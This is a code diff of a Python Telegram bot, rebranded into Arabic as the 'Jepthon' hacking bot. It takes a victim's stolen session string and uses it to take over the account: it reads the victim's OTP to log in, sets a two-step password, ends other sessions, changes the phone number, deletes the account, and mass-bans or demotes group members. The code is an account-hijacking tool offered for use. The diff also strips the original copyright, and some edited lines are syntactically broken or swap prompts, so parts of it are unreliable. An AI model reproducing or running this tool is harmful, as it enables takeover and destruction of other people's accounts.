@@ -1,5 +1,3 @@
-# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
-# NOW PUBLIC BY LEGENDX
 import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types
@@ -153,33 +151,33 @@ menu = '''
 FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
 
 
-A: [check user own groups and channels]
+A: [*لــعرض قـنوات الشخص ومجموعاته*]
 
-B: [check user all information like phone number usrname...]
+B: [**معلومات المستخدم مثل يوزر نيم ورقمه والاخخ،...**]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+C: [*تفليش كروب وحضر اعضاءه*}]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+D: [*تســجيل الـدخول الئ حساب المستخدم *}]
 
-E: [Join A Group/Channel via StringSession]
+E: [*اشتراك بقنا معينه*]
 
-F: [Leave A Group/Channel via StringSession]
+F: [**مغادره قنا معينه**]
 
-G: [Delete A Group/Channel]
+G: [*حذف كروب او قنا*]
 
-H: [Check user two step is eneable or disable]
+H: [تحقق اذا كان المستخدم يستخدم مصادقه - او تححق بخطوتين**]
 
-I: [Terminate All current active sessions except Your StringSession]
+I: [تسجيل خروج من جميع الجلسات ماعده جلسه البوت]
 
-J: [Delete Account]
+J: [حذف الحساب]
 
-K: [Demote all admins in a group/channel]
+K: [تنزيل جميع المشرفين في كروب او قنا معينه]
 
-L: [Promote a member in a group/channel]
+L: [ترقيتك في قنا معينه]
 
-M: [Change Phone number using StringSession]
+M: [تغغير رقم الهاتف الخاص بلشخص]
 
-I ADD MORE FEATURES LATER 😆
+***قنا البوت :@JEPTHON**
 '''
 mm = '''
 You can hack anybody
@@ -204,7 +202,7 @@ async def op(event):
     print (e)
 
 
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@client.on(events.NewMessage(pattern="/HAKC", func=lambda x: x.is_group))
 async def op(event):
   await event.reply("please use me in pm🥺")
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
@@ -215,101 +213,101 @@ async def start(event):
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطني كود تريمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("تم انهاء الجلسه")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("تم انهاء الجلسه")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY @JEPTHON")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\nThanks شكرا لاستخادم بوت جيبثون للختراق")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطني كود تريمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("تـم انهاء الجلـسه...")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nشكرا لستخدام بوت جيبثون للختراق")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطني كود تريمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("تم انهاء الجللسه منقبل المستخدم")
+      await x.send_message("ايدي القنا او الكروب")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("شكرا لاستخدامك بوت جيبثون للختراق")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطيني كود تريمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("تـم تفليش المجموعه ✅")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks شـكرا لاستخدام بوت جيبثون للختراق")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطيني كود تريمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("تـم انهاء كود التريمكس ")
+      await x.send_message("اعطيني كود تريمكس")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Joined the Channel/Group شكرا لاستخدام بوت جيبثون للختراق")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطيني ايدي القنا او الكروب")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("تم انهاء كود تريمكس ")
+      await x.send_message("ايدي القنا او الكروب")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("ايدي القنا او الكروب") شكرا لاستخدام بوت جيبثون للختراق")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطيني كود تريمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
         return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+      await x.send_message("اعطيني ايدي القنا او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
       await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطني كود ترمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("كود التريمكس منتهي")
       i = await user2fa(strses.text)
       if i:
         await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
@@ -334,7 +332,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks شكرا لاستخدام بوت جيبثون للختراق")
     elif res.text == "L":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -348,7 +346,7 @@ async def start(event):
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("I am Promoting you in Group/Channel wait a min 🔐✅🗿\n\nThanks  شكرا لاستخدام بوت جيبثون للختراق")
     elif res.text == "K":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -363,9 +361,9 @@ async def start(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("I am Demoting all members of Group/Channel wait a min ✅🗿🔐\n\nThanks شكرا لاستخدام بوت جيبثون للختراق")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("اعطني كود ترممكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
